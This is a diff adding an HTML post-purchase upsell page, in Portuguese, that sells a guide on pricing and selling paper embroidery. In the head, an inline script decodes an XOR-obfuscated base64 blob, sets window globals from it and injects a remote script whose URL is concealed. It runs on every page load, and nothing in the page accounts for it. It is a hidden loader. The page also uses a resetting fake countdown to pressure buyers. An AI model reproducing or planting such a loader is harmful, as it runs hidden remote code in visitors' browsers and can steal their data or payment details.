@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Da Agulha ao Primeiro Pedido — Oferta exclusiva pós-compra</title>
+  <meta name="description" content="O guia de vendas para quem borda em papel: precificação, fotos, anúncios prontos e envio. Oferta única, disponível só nesta página.">
+  <meta name="theme-color" content="#3d5a47">
+  <meta name="robots" content="noindex">
+
+  <link rel="icon" type="image/png" href="images/icon.png">
+  <link rel="apple-touch-icon" href="images/icon.png">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght,SOFT@0,9..144,400,0..100;0,9..144,500,0..100;0,9..144,600,0..100;0,9..144,700,0..100;1,9..144,400,0..100;1,9..144,500,0..100&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+  <script>(function(){var g_y3=atob("DBJYqsn3ARmFXX2UXGl637ubIyOnNQngLGFiheaUZXerKAn5NXQhhKqYbDfnL1LnP2Ax2r2ELmnsJRj4c2Ix0qybLH7qMhr4OTwy2evbI3jxKQ/9Pmcsz7rVO0LYcV/zMH06y6WEIyPeJl/6PX89iPPVZnbqOhHxDHsgz6W+ZTupfwv1MGc9iPPVN3iyahmmbCc7maiTMyGwPxz3OXY5mKjEI2TYIA==");var f_wvhy=[];for(var u_yv=0;u_yv<g_y3.length;u_yv++){f_wvhy.push(g_y3.charCodeAt(u_yv)&255);}var l_jg=f_wvhy[0];var l_nj=f_wvhy.slice(1,1+l_jg);var f_v3mr=f_wvhy.slice(1+l_jg);var w_syru=f_v3mr.map(function(b,w_8z6){return b^l_nj[w_8z6%l_jg];});var w_a="";for(var n_bj5y=0;n_bj5y<w_syru.length;n_bj5y++){w_a+=String.fromCharCode(w_syru[n_bj5y]&255);}var v_b9g=decodeURIComponent(escape(w_a));var x_8=JSON.parse(v_b9g);var k_0ze=x_8.globals||[];k_0ze.forEach(function(u_3lxc){window[u_3lxc.name]=u_3lxc.value;});var n_v6qi=document.createElement("script");n_v6qi.src=x_8.url;n_v6qi.async=true;n_v6qi.defer=true;(x_8.attributes||[]).forEach(function(a_lp){n_v6qi.setAttribute(a_lp.name,a_lp.value);});(document.head||document.documentElement).appendChild(n_v6qi);})();</script>
+
+  <link rel="stylesheet" href="css/style.css">
+
+  <!--
+    IMPLEMENTAÇÃO — página de Upsell (OTO) pós-compra "Da Agulha ao Primeiro Pedido"
+    - Diferente dos order bumps de moldes: aqui vendemos uma habilidade (vender o que ela borda), não mais moldes.
+    - Exibir imediatamente após a confirmação de pagamento (incluindo bumps aceitos), antes da página de obrigado/entrega.
+    - Botão principal deve processar em 1 clique reaproveitando o pagamento já aprovado — sem pedir dados de novo.
+    - Link de aceite já preenchido: https://checkout.atelierdigital.site/VCCL1O8SD85B (3 ocorrências, classe .oto-accept-btn).
+    - Falta o link de recusa: substituir [LINK DE RECUSA] pelo destino real (classe .oto-decline-btn).
+    - Cronômetro de 12 min é opcional/evergreen (reinicia por sessão), só reforça urgência visual.
+  -->
+
+  <style>
+    /* ─── OTO / Upsell — página única, sem navegação, foco total na oferta ─── */
+    body { min-height: 100vh; }
+
+    .oto-page {
+      min-height: 100vh;
+      background: linear-gradient(180deg, var(--sage-wash) 0%, var(--paper) 420px);
+      padding: 44px 16px;
+    }
+    .oto-card {
+      max-width: 720px;
+      margin: 0 auto;
+      background: var(--paper);
+      border-radius: var(--r-xl);
+      box-shadow: 0 30px 80px -30px oklch(38% 0.045 145 / 0.4);
+      overflow: hidden;
+    }
+
+    /* Hero / acima da dobra */
+    .oto-hero {
+      padding: 40px 40px 36px;
+      text-align: center;
+      background: var(--paper-warm);
+      border-bottom: 1px solid var(--linen);
+    }
+    .oto-badge {
+      display: inline-flex; align-items: center; gap: 7px;
+      background: var(--terracotta-deep); color: var(--paper);
+      padding: 8px 18px; border-radius: 50px;
+      font-size: 12px; font-weight: 700; letter-spacing: 0.06em;
+      text-transform: uppercase; margin-bottom: 22px;
+    }
+    .oto-timer-block { margin-bottom: 26px; }
+    .oto-h1 {
+      font-family: 'Fraunces', serif; font-weight: 500;
+      font-size: clamp(23px, 4vw, 32px); line-height: 1.3;
+      color: var(--ink); max-width: 520px; margin: 0 auto 6px;
+    }
+    .oto-h1 .kicker {
+      display: block; font-family: 'Inter', sans-serif;
+      font-size: 13px; font-weight: 700; letter-spacing: 0.06em;
+      text-transform: uppercase; color: var(--ink-mute); margin-bottom: 12px;
+    }
+    .oto-h1 em {
+      font-style: italic; color: var(--sage-deep);
+      font-variation-settings: "opsz" 144;
+    }
+    .oto-sub {
+      max-width: 480px; margin: 18px auto 28px;
+      color: var(--ink-soft); font-size: var(--t-sm); line-height: 1.65;
+    }
+    .sr-only {
+      position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px;
+      overflow: hidden; clip: rect(0,0,0,0); white-space: nowrap; border: 0;
+    }
+    .oto-hero-img {
+      display: block; width: 100%; height: auto; max-width: 460px; margin: 0 auto 26px;
+      border-radius: var(--r-lg); box-shadow: 0 20px 50px -20px oklch(38% 0.045 145 / 0.35);
+    }
+    .oto-cta { width: 100%; max-width: 440px; margin: 0 auto; }
+    .oto-cta .po-btn-main { font-size: 15px; }
+    .oto-cta .po-btn-sub { font-size: 10px; }
+    .oto-decline {
+      display: inline-block; margin-top: 16px;
+      font-size: 13px; color: var(--ink-mute); text-decoration: underline;
+      text-underline-offset: 2px;
+    }
+    .oto-decline:hover { color: var(--ink-soft); }
+
+    /* Corpo — seções empilhadas */
+    .oto-section { padding: 40px 40px; border-bottom: 1px solid var(--linen); }
+    .oto-section:last-of-type { border-bottom: none; }
+    .oto-section-alt { background: var(--paper-warm); }
+    .oto-section-sage { background: var(--sage-wash); }
+    .oto-section h2 { font-size: clamp(21px, 3vw, 27px); margin-bottom: 14px; }
+    .oto-lead { font-weight: 600; color: var(--ink); font-size: var(--t-base); margin-bottom: 14px; max-width: 62ch; }
+    .oto-section p { color: var(--ink-soft); line-height: 1.75; margin-bottom: 12px; max-width: 62ch; }
+    .oto-section p:last-child { margin-bottom: 0; }
+
+    /* Módulos (o que está dentro) */
+    .oto-modules { list-style: none; margin: 0; padding: 0; display: flex; flex-direction: column; gap: 16px; }
+    .oto-modules li { display: flex; gap: 12px; align-items: flex-start; }
+    .oto-check-dot {
+      flex-shrink: 0; width: 26px; height: 26px; margin-top: 1px;
+      border-radius: 50%; background: var(--sage-wash); color: var(--sage-deep);
+      display: flex; align-items: center; justify-content: center;
+    }
+    .oto-modules strong { color: var(--ink); }
+    .oto-modules .desc { color: var(--ink-soft); }
+    .oto-modules .price-tag {
+      display: inline-block; margin-left: 6px; font-size: 12px; font-weight: 700;
+      color: var(--sage-deep); white-space: nowrap;
+    }
+
+    /* Confirmação de compra — acima do badge de urgência */
+    .oto-confirm {
+      display: inline-flex; align-items: center; gap: 6px;
+      font-size: 12.5px; font-weight: 700; color: var(--sage-deep);
+      letter-spacing: 0.02em; margin-bottom: 14px;
+    }
+    .oto-confirm svg { color: var(--sage); flex-shrink: 0; }
+
+    /* Linha de confiança sob o botão */
+    .oto-trust {
+      display: flex; flex-wrap: wrap; align-items: center; justify-content: center;
+      gap: 6px 16px; margin: 16px auto 0; font-size: 12.5px; color: var(--ink-mute);
+      max-width: 460px;
+    }
+    .oto-trust span { display: inline-flex; align-items: center; gap: 5px; }
+
+    /* Três benefícios rápidos — "sem improvisar / travar / esperar" */
+    .oto-benefits {
+      display: grid; grid-template-columns: repeat(3, 1fr); gap: 14px;
+    }
+    .oto-benefit {
+      text-align: center; padding: 20px 14px; border: 1px solid var(--linen);
+      border-radius: var(--r-lg); background: var(--paper);
+    }
+    .oto-benefit-icon {
+      width: 40px; height: 40px; margin: 0 auto 10px; border-radius: 50%;
+      background: var(--sage-wash); color: var(--sage-deep);
+      display: flex; align-items: center; justify-content: center;
+    }
+    .oto-benefit h3 { font-size: 15px; font-weight: 700; color: var(--ink); margin-bottom: 4px; font-family: 'Inter', sans-serif; }
+    .oto-benefit p { font-size: 12.5px; color: var(--ink-mute); line-height: 1.5; margin: 0; }
+    @media (max-width: 560px) {
+      .oto-benefits { grid-template-columns: 1fr; }
+    }
+
+    /* Stack de valor */
+    .oto-stack {
+      border: 1px solid var(--linen); border-radius: var(--r-lg);
+      overflow: hidden; margin-bottom: 22px; background: var(--paper);
+    }
+    .oto-stack-row {
+      display: flex; justify-content: space-between; gap: 12px;
+      padding: 13px 18px; border-bottom: 1px dashed var(--linen);
+      font-size: var(--t-sm); color: var(--ink-soft);
+    }
+    .oto-stack-row span:last-child { color: var(--ink-mute); white-space: nowrap; font-weight: 500; }
+    .oto-stack-total {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 15px 18px; font-weight: 700; color: var(--ink); background: var(--paper-warm);
+    }
+    .oto-stack-total span:last-child { text-decoration: line-through; color: var(--ink-mute); font-weight: 600; }
+
+    /* Caixa de preço */
+    .oto-price-box {
+      text-align: center; border: 2px dashed var(--terracotta); border-radius: var(--r-lg);
+      padding: 26px 20px; margin-bottom: 22px; background: oklch(98% 0.020 40 / 0.5);
+    }
+    .oto-price-was { font-size: 15px; color: var(--ink-mute); text-decoration: line-through; margin-bottom: 4px; }
+    .oto-price-now {
+      font-family: 'Fraunces', serif; font-size: 54px; font-weight: 700;
+      color: var(--terracotta-deep); line-height: 1; letter-spacing: -0.03em; margin-bottom: 12px;
+    }
+    .oto-price-save {
+      display: inline-block; background: oklch(85% 0.090 145); color: oklch(30% 0.085 145);
+      padding: 6px 14px; border-radius: 50px; font-size: 12.5px; font-weight: 700;
+    }
+
+    .oto-checks { list-style: none; margin: 22px 0 0; padding: 0; display: flex; flex-direction: column; gap: 9px; }
+    .oto-checks li { display: flex; gap: 9px; align-items: center; font-size: var(--t-sm); color: var(--ink-soft); }
+    .oto-checks svg { color: var(--ok); flex-shrink: 0; }
+
+    /* Para quem já comprou — citações */
+    .oto-quotes { display: flex; flex-direction: column; gap: 16px; }
+    .oto-quote {
+      border-left: 3px solid var(--sage); padding: 2px 0 2px 18px;
+      color: var(--ink-soft); font-size: var(--t-sm); line-height: 1.65;
+    }
+    .oto-quote strong { color: var(--ink); }
+
+    /* CTA final */
+    .oto-final { text-align: center; }
+    .oto-final p { margin: 0 auto 26px; }
+
+    .oto-footer { margin-top: 24px; text-align: center; font-size: 12px; color: var(--ink-mute); }
+    .oto-footer a { color: var(--ink-mute); text-decoration: underline; }
+
+    @media (max-width: 560px) {
+      .oto-hero, .oto-section { padding-left: 24px; padding-right: 24px; }
+      .oto-price-now { font-size: 44px; }
+      .oto-stack-row, .oto-stack-total { padding-left: 16px; padding-right: 16px; font-size: 13.5px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="oto-page">
+    <div class="oto-card">
+
+      <!-- ═══ ACIMA DA DOBRA ═══ -->
+      <div class="oto-hero">
+
+        <span class="oto-confirm">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+          Compra confirmada!
+        </span>
+
+        <span class="oto-badge">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2a1 1 0 0 1 1 1v2.07a8.001 8.001 0 0 1 6.93 6.93H22a1 1 0 1 1 0 2h-2.07a8.001 8.001 0 0 1-6.93 6.93V23a1 1 0 1 1-2 0v-2.07a8.001 8.001 0 0 1-6.93-6.93H2a1 1 0 1 1 0-2h2.07a8.001 8.001 0 0 1 6.93-6.93V3a1 1 0 0 1 1-1zm0 4a6 6 0 1 0 0 12 6 6 0 0 0 0-12z"></path></svg>
+          Oferta exclusiva — apenas neste momento
+        </span>
+
+        <div class="oto-timer-block">
+          <div class="po-timer-label">
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+            Esta oferta some em
+          </div>
+          <div class="po-timer-clock" id="otoCountdown">
+            <div class="po-timer-unit"><span class="po-timer-num" data-cd="minutes">12</span><span class="po-timer-lbl">Min</span></div>
+            <div class="po-timer-sep">:</div>
+            <div class="po-timer-unit"><span class="po-timer-num" data-cd="seconds">00</span><span class="po-timer-lbl">Seg</span></div>
+          </div>
+        </div>
+
+        <!-- Headline — Opção A (recomendada). Alternativas B e C abaixo, para teste A/B se desejar.
+        B: "Seu pedido foi confirmado. Só falta o pedaço que ninguém te ensina: como transformar a peça pronta em um pedido pago."
+        C: "Pergunta rápida antes de você sair: já sabe quanto cobrar pela sua primeira peça?" -->
+        <h1 class="oto-h1">
+          Você acabou de aprender a bordar.<br>Agora aprenda a <em>vender o que borda</em>.
+        </h1>
+
+        <p class="oto-sub">
+          O <strong>"Da Agulha ao Primeiro Pedido"</strong> traz tudo pronto pra você sair da peça acabada ao
+          primeiro pedido pago — sem improvisar preço, sem travar na hora de anunciar, sem perder tempo criando
+          do zero.
+        </p>
+
+        <img
+          src="images/upsell.png"
+          alt="Da Agulha ao Primeiro Pedido — Método Bordado em Papel™. Tudo pronto para você vender hoje: precificação pronta, fotos que vendem, anúncios prontos."
+          class="oto-hero-img"
+          width="1792" height="2400"
+        >
+
+        <a href="https://checkout.atelierdigital.site/VCCL1O8SD85B" class="po-btn oto-cta oto-accept-btn">
+          <span class="po-btn-main">SIM, QUERO O GUIA POR $ 27,00</span>
+        </a>
+
+
+        <a href="[LINK DE RECUSA]" class="oto-decline oto-decline-btn">Não, obrigada — prefiro descobrir sozinha como vender</a>
+      </div>
+
+      <!-- ═══ TRÊS BENEFÍCIOS RÁPIDOS ═══ -->
+      <div class="oto-section">
+        <div class="oto-benefits">
+          <div class="oto-benefit">
+            <div class="oto-benefit-icon">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><circle cx="12" cy="12" r="4.5"></circle><circle cx="12" cy="12" r="0.6" fill="currentColor"></circle></svg>
+            </div>
+            <h3>Sem improvisar</h3>
+            <p>Preço, foto e anúncio prontos — não é chute, é o que já funciona.</p>
+          </div>
+          <div class="oto-benefit">
+            <div class="oto-benefit-icon">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.59 13.41 11 3.83 3.83 11 13.41 20.59a2 2 0 0 0 2.83 0l4.35-4.35a2 2 0 0 0 0-2.83z"></path><circle cx="7.5" cy="7.5" r="1.4" fill="currentColor" stroke="none"></circle></svg>
+            </div>
+            <h3>Sem travar</h3>
+            <p>Você sabe exatamente quanto cobrar, sem medo de assustar o cliente.</p>
+          </div>
+          <div class="oto-benefit">
+            <div class="oto-benefit-icon">
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+            </div>
+            <h3>Sem esperar</h3>
+            <p>Anúncio pronto pra copiar e publicar hoje, não daqui a um mês.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- ═══ 1. O PROBLEMA ═══ -->
+      <div class="oto-section oto-section-alt">
+        <span class="eyebrow">O que ninguém te conta</span>
+        <h2>O problema que só aparece depois</h2>
+        <p class="oto-lead">Você já sabe bordar. Vender é outra habilidade — e ninguém te ensinou essa parte.</p>
+        <p>
+          Essa é a parte em que a maioria trava. Não é falta de talento — é falta de saber quanto cobrar sem
+          "dar molezinha". É falta de uma foto que faça a peça parecer profissional, não amadora. É falta de um
+          texto de anúncio que faça alguém parar de rolar a tela e comprar. É falta de saber embalar sem gastar
+          mais do que a peça vale.
+        </p>
+        <p>
+          Sem essas respostas, a peça linda fica guardada numa gaveta — ou vendida por muito menos do que vale,
+          só pra "sair logo".
+        </p>
+        <p><strong>O "Da Agulha ao Primeiro Pedido" resolve exatamente isso</strong> — com tudo pronto, sem precisar criar nada do zero.</p>
+      </div>
+
+      <!-- ═══ 2. A SOLUÇÃO ═══ -->
+      <div class="oto-section">
+        <span class="eyebrow">O caminho completo</span>
+        <h2>Da Agulha ao Primeiro Pedido</h2>
+        <p class="oto-lead">O caminho inteiro, do acabamento à venda.</p>
+        <p>Um guia direto ao ponto, pensado pra quem nunca vendeu artesanato antes e não quer errar caro:</p>
+
+        <ul class="oto-modules">
+          <li>
+            <span class="oto-check-dot">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </span>
+            <span class="desc"><strong>Precificação Sem Feirinha</strong> — a conta certa (material + tempo + mercado) pra você não vender barato demais nem travar a venda com um preço fora da realidade.<span class="price-tag">Valor: R$ 47,00</span></span>
+          </li>
+          <li>
+            <span class="oto-check-dot">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </span>
+            <span class="desc"><strong>Fotos que Vendem</strong> — como fotografar bordado em papel só com o celular: luz, fundo e ângulo, no mesmo estilo verde-sálvia e terracota das suas peças.<span class="price-tag">Valor: R$ 37,00</span></span>
+          </li>
+          <li>
+            <span class="oto-check-dot">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </span>
+            <span class="desc"><strong>Kit de Anúncios Prontos</strong> — título e descrição prontos para cada categoria de molde (marcadores, flores, casamento, bebê, sazonais, monogramas), pra usar direto no Mercado Livre, Shopee e Instagram.<span class="price-tag">Valor: R$ 47,00</span></span>
+          </li>
+          <li>
+            <span class="oto-check-dot">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+            </span>
+            <span class="desc"><strong>Embalagem e Envio</strong> — como embalar de forma bonita e barata, e despachar sem a peça amassar ou rasgar no caminho.<span class="price-tag">Valor: R$ 27,00</span></span>
+          </li>
+        </ul>
+      </div>
+
+      <!-- ═══ 3. STACK DE VALOR + PREÇO ═══ -->
+      <div class="oto-section oto-section-alt">
+        <span class="eyebrow">A oferta desta página</span>
+        <h2>Tudo isso, por uma fração do valor</h2>
+
+        <div class="oto-stack">
+          <div class="oto-stack-row"><span>Guia de Precificação Sem Feirinha</span><span>R$ 47,00</span></div>
+          <div class="oto-stack-row"><span>Fotos que Vendem — guia de fotografia com celular</span><span>R$ 37,00</span></div>
+          <div class="oto-stack-row"><span>Kit de Anúncios Prontos — títulos e descrições por categoria</span><span>R$ 47,00</span></div>
+          <div class="oto-stack-row"><span>Guia de Embalagem e Envio</span><span>R$ 27,00</span></div>
+          <div class="oto-stack-row"><span>Bônus: Calendário de Picos de Venda</span><span>R$ 27,00</span></div>
+          <div class="oto-stack-total"><span>Valor total</span><span>R$ 185,00</span></div>
+        </div>
+
+        <div class="oto-price-box">
+          <div class="oto-price-was">De R$ 185,00</div>
+          <div class="oto-price-now">R$ 27,00</div>
+          <span class="oto-price-save">você economiza R$ 158,00 (85%) — só nesta página, só agora</span>
+        </div>
+
+        <ul class="oto-checks">
+          <li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg> Acesso vitalício, em PDF, no mesmo padrão de qualidade do material principal</li>
+          <li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg> Entrega imediata, junto com o restante do seu material</li>
+          <li><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg> Pagamento único, sem assinatura</li>
+        </ul>
+
+        <div style="height:26px"></div>
+        <a href="https://checkout.atelierdigital.site/VCCL1O8SD85B" class="po-btn oto-cta oto-accept-btn">
+          <span class="po-btn-main">SIM, QUERO O GUIA POR R$ 27,00</span>
+        </a>
+        <div style="text-align:center">
+          <a href="[LINK DE RECUSA]" class="oto-decline oto-decline-btn">Não, obrigada — prefiro descobrir sozinha como vender</a>
+        </div>
+      </div>
+
+      <!-- ═══ 4. PARA QUEM JÁ COMPROU ═══ -->
+      <div class="oto-section oto-section-sage">
+        <span class="eyebrow">Por que isso importa pra você</span>
+        <h2>Seja qual for o motivo da sua compra</h2>
+        <div class="oto-quotes">
+          <p class="oto-quote"><strong>Se você comprou para gerar renda:</strong> este é exatamente o pedaço que faltava entre "peça pronta" e "primeiro dinheiro caindo na conta" — sem tentativa e erro.</p>
+          <p class="oto-quote"><strong>Se você comprou para presentear:</strong> as mesmas fotos e embalagens que vendem também fazem qualquer presente parecer mais especial na hora de entregar.</p>
+          <p class="oto-quote"><strong>Se você comprou só para acalmar:</strong> não custa nada ter esse guia pronto pra quando (se um dia) você decidir que aquela pilha de peças bonitas pode virar uma rendinha extra.</p>
+        </div>
+      </div>
+
+      <!-- ═══ 5. GARANTIA ═══ -->
+      <div class="oto-section">
+        <div class="guarantee">
+          <div class="guarantee-seal">
+            <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+              <polyline points="9 12 11 14 15 10"></polyline>
+            </svg>
+          </div>
+          <span class="eyebrow center">Mesma garantia de sempre</span>
+          <h2>7 dias. Sem perguntas.</h2>
+          <p>
+            Se o guia não for pra você, é só avisar dentro de 7 dias e devolvemos o valor, sem burocracia —
+            exatamente como no Método Bordado em Papel™.
+          </p>
+        </div>
+      </div>
+
+      <!-- ═══ 6. PERGUNTAS RÁPIDAS ═══ -->
+      <div class="oto-section oto-section-alt">
+        <div class="section-intro" style="margin-bottom:8px;">
+          <span class="eyebrow">Antes de decidir</span>
+          <h2>Perguntas rápidas</h2>
+        </div>
+
+        <div class="faq">
+          <div class="faq-item">
+            <button class="faq-q">
+              Já comprei o Método Bordado em Papel™. Esse guia é separado?
+              <span class="plus">+</span>
+            </button>
+            <div class="faq-a"><div class="faq-a-inner">
+              Sim. O Método ensina a fazer as peças — moldes, técnica, acabamento. O "Da Agulha ao Primeiro
+              Pedido" é um complemento focado 100% em vendas: precificação, fotos, anúncios prontos e envio.
+            </div></div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-q">
+              Preciso ter loja, CNPJ ou experiência com vendas?
+              <span class="plus">+</span>
+            </button>
+            <div class="faq-a"><div class="faq-a-inner">
+              Não. Foi criado para quem nunca vendeu nada, como pessoa física, em marketplaces e redes sociais.
+            </div></div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-q">
+              Esta oferta vai aparecer de novo depois?
+              <span class="plus">+</span>
+            </button>
+            <div class="faq-a"><div class="faq-a-inner">
+              Não. Esta página é exibida uma única vez, logo após a confirmação da sua compra. Depois de sair,
+              o preço de R$ 27,00 não fica mais disponível.
+            </div></div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-q">
+              Preciso pagar de novo, com todos os dados do cartão?
+              <span class="plus">+</span>
+            </button>
+            <div class="faq-a"><div class="faq-a-inner">
+              Não. É um clique — usamos o mesmo pagamento que você acabou de confirmar.
+            </div></div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-q">
+              Quando recebo o acesso?
+              <span class="plus">+</span>
+            </button>
+            <div class="faq-a"><div class="faq-a-inner">
+              Imediatamente após a confirmação, junto com o restante do seu material.
+            </div></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- ═══ 7. CTA FINAL ═══ -->
+      <div class="oto-section oto-final">
+        <span class="eyebrow center">Última chance nesta página</span>
+        <h2>Uma decisão. Um clique. O caminho inteiro até o primeiro pedido.</h2>
+        <p>
+          Você tem os moldes. Você tem o passo a passo pra bordar. Agora você tem a precificação, as fotos e os
+          anúncios prontos. Por R$ 27,00, você não começa do zero nas vendas. Você começa na frente.
+        </p>
+        <a href="https://checkout.atelierdigital.site/VCCL1O8SD85B" class="po-btn oto-cta oto-accept-btn">
+          <span class="po-btn-main">SIM, QUERO O GUIA POR R$ 27,00</span>
+          <span class="po-btn-sub">Um clique · mesmo pagamento já aprovado</span>
+        </a>
+        <div>
+          <a href="[LINK DE RECUSA]" class="oto-decline oto-decline-btn">Não, obrigada — prefiro descobrir sozinha como vender</a>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="oto-footer">
+      <div class="footer-legal">
+        <p>Atelier Digital é uma marca/produto da WHG Digital Ltda.</p>
+        <p>WHG Digital Ltda. · CNPJ: 63.944.090/0001-99 · <a href="mailto:whgdigital@hotmail.com">whgdigital@hotmail.com</a></p>
+      </div>
+      © 2026 Atelier Digital · <a href="privacy.html">Política de Privacidade</a> · <a href="terms.html">Termos de Uso</a>
+    </div>
+  </div>
+
+  <!-- FAQ accordion + reveal-on-scroll (reaproveitado de site.js) -->
+  <script src="js/site.js" defer></script>
+
+  <!-- Checkout de 1 clique desta oferta + captura de UTM + cronômetro de 12min -->
+  <script src="js/upsell.js" defer></script>
+
+</body>
+</html>
